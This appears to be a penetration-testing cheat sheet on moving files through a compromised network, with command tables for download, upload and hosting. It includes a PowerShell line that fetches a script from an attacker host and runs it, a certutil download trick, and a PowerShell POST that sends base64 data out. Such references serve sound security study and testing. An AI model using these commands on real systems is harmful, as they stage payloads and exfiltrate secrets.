**Overview:**

- Attackers frequently exploit legitimate services (like SSH or FTP) to move files quietly within a compromised network.
- File transfers look simple but are powerful: misconfigured SSH, FTP, NFS or MS-SQL services let attackers stage payloads, exfiltrate secrets, or pivot to the OS with minimal fuss.
---

## Download

|Method|Command|Platform|
|---|---|---|
|PowerShell|`IEX (New-Object Net.WebClient).DownloadString('http://<lhost>/<file>')`|Windows|
|Certutil|`certutil.exe -verifyctl -split -f http://<lhost>/<file>`|Windows|
|wget|`wget http://<lhost>/<file> -O /tmp/<file>`|Linux|
|SCP|`scp <user>@<target>:/tmp/<file> C:\Temp\<file>`|Windows|

---

## Upload

|Method|Command|Platform|
|---|---|---|
|PowerShell|`Invoke-WebRequest -Uri http://<lhost>:<port> -Method POST -Body $b64`|Windows|
|SCP|`scp C:\Temp\<file> <user>@<target>:/tmp/<file>`|Windows|
|SCP|`scp /tmp/<file> <user>@<target>:/tmp/<file>`|Linux|

---

## Host

|Method|Command|Platform|
|---|---|---|
|Python HTTP|`sudo python3 -m http.server <port>`|Linux|
|Impacket SMB|`impacket-smbserver -ip <lhost> -smb2support -username <user> -password <password> <share> <path>`|Linux|